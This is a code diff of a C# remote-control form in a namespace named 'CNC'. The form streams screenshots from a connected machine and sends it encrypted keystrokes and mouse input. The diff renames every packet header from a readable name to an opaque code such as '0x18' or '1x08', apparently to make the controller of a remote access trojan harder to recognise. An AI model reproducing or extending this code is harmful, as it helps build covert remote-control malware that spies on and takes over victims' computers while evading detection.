@@ -40,13 +40,13 @@ namespace CNC.Forms
             if(isListening && chkControlKeyboard.Checked)
             {
                 e.Handled = true;
-                currentClient.Connection.SendObject<string>("SendKeyReq", Cryptography.Encrypt(e.KeyChar.ToString()));
+                currentClient.Connection.SendObject<string>("0x13", Cryptography.Encrypt(e.KeyChar.ToString()));
             }
         }
 
         public void ListenForImages()
         {
-            currentClient.Connection.AppendIncomingPacketHandler<byte[]>("ScreenshotSubmit", (header, connection, incomingBytes) =>
+            currentClient.Connection.AppendIncomingPacketHandler<byte[]>("1x08", (header, connection, incomingBytes) =>
             {
               //  screenImage.Invoke( = BitmapConvert.byteArrayToImage(incomingBytes);
                 if (screenImage.InvokeRequired)
@@ -89,7 +89,7 @@ namespace CNC.Forms
 
         public void StopListenForImages()
         {
-            currentClient.Connection.RemoveIncomingPacketHandler("ScreenshotSubmit");
+            currentClient.Connection.RemoveIncomingPacketHandler("1x08");
         }
 
         private void statusButton_Click(object sender, EventArgs e)
@@ -102,7 +102,7 @@ namespace CNC.Forms
                     Type = Shared.Enums.SubmitScreenStatusE.StopSubmit,
                     Monitor = (int)numericMonitor.Value
                 };
-                currentClient.Connection.SendObject<string>("SubmitScreenReq", Cryptography.Encrypt(JsonConvert.SerializeObject(submitStatus)));
+                currentClient.Connection.SendObject<string>("0x09", Cryptography.Encrypt(JsonConvert.SerializeObject(submitStatus)));
                 statusButton.Text = "Start";
                 StopListenForImages();
                 isListening = false;
@@ -115,7 +115,7 @@ namespace CNC.Forms
                     Type = Shared.Enums.SubmitScreenStatusE.StartSubmit,
                     Monitor = (int)numericMonitor.Value
                 };
-                currentClient.Connection.SendObject<string>("SubmitScreenReq", Cryptography.Encrypt(JsonConvert.SerializeObject(submitStatus)));
+                currentClient.Connection.SendObject<string>("0x09", Cryptography.Encrypt(JsonConvert.SerializeObject(submitStatus)));
                 statusButton.Text = "Stop";
                 ListenForImages();
                 isListening = true;
@@ -130,7 +130,7 @@ namespace CNC.Forms
                 Type = Shared.Enums.SubmitScreenStatusE.ChangeMonitor,
                 Monitor = (int)numericMonitor.Value
             };
-            currentClient.Connection.SendObject<string>("SubmitScreenReq", Cryptography.Encrypt(JsonConvert.SerializeObject(submitStatus)));
+            currentClient.Connection.SendObject<string>("0x09", Cryptography.Encrypt(JsonConvert.SerializeObject(submitStatus)));
         }
 
         private void RemoteControll_FormClosing(object sender, FormClosingEventArgs e)
@@ -141,7 +141,7 @@ namespace CNC.Forms
                 Type = Shared.Enums.SubmitScreenStatusE.StopSubmit,
                 Monitor = (int)numericMonitor.Value
             };
-            currentClient.Connection.SendObject<string>("SubmitScreenReq", Cryptography.Encrypt(JsonConvert.SerializeObject(submitStatus)));
+            currentClient.Connection.SendObject<string>("0x09", Cryptography.Encrypt(JsonConvert.SerializeObject(submitStatus)));
             statusButton.Text = "Start";
             StopListenForImages();
             isListening = false;
@@ -162,7 +162,7 @@ namespace CNC.Forms
             if(chkControlMouse.Checked && isListening && (lastEvent == null || ScreenHelper.DistanceBetweenScreenPoint(currentPoint, lastEvent) >= 0.001))
             {
                 //We moved more than X.
-                currentClient.Connection.SendObject<string>("MouseEventReq", Cryptography.Encrypt(JsonConvert.SerializeObject(currentPoint)));
+                currentClient.Connection.SendObject<string>("0x18", Cryptography.Encrypt(JsonConvert.SerializeObject(currentPoint)));
                 lastEvent = currentPoint;
             }
         }
@@ -175,7 +175,7 @@ namespace CNC.Forms
                 Type = Shared.Enums.SubmitScreenStatusE.ChangeRefresh,
                 Monitor = (int)numericMonitor.Value
             };
-            currentClient.Connection.SendObject<string>("SubmitScreenReq", Cryptography.Encrypt(JsonConvert.SerializeObject(submitStatus)));
+            currentClient.Connection.SendObject<string>("0x09", Cryptography.Encrypt(JsonConvert.SerializeObject(submitStatus)));
         }
 
         private void screenImage_MouseClick(object sender, MouseEventArgs e)
@@ -199,7 +199,7 @@ namespace CNC.Forms
                     Y = (double)e.Location.Y / (double)screenImage.Size.Height
                 };
 
-                currentClient.Connection.SendObject<string>("MouseEventReq", Cryptography.Encrypt(JsonConvert.SerializeObject(currentPoint)));
+                currentClient.Connection.SendObject<string>("0x18", Cryptography.Encrypt(JsonConvert.SerializeObject(currentPoint)));
                 lastEvent = currentPoint;
             }
         }
@@ -219,7 +219,7 @@ namespace CNC.Forms
                 if (isListening)
                 {
                     //We moved more than X.
-                    currentClient.Connection.SendObject<string>("MouseEventReq", Cryptography.Encrypt(JsonConvert.SerializeObject(currentPoint)));
+                    currentClient.Connection.SendObject<string>("0x18", Cryptography.Encrypt(JsonConvert.SerializeObject(currentPoint)));
                     lastEvent = currentPoint;
                 }
             }
@@ -236,7 +236,7 @@ namespace CNC.Forms
                 if (isListening)
                 {
                     //We moved more than X.
-                    currentClient.Connection.SendObject<string>("MouseEventReq", Cryptography.Encrypt(JsonConvert.SerializeObject(currentPoint)));
+                    currentClient.Connection.SendObject<string>("0x18", Cryptography.Encrypt(JsonConvert.SerializeObject(currentPoint)));
                     lastEvent = currentPoint;
                 }
             }
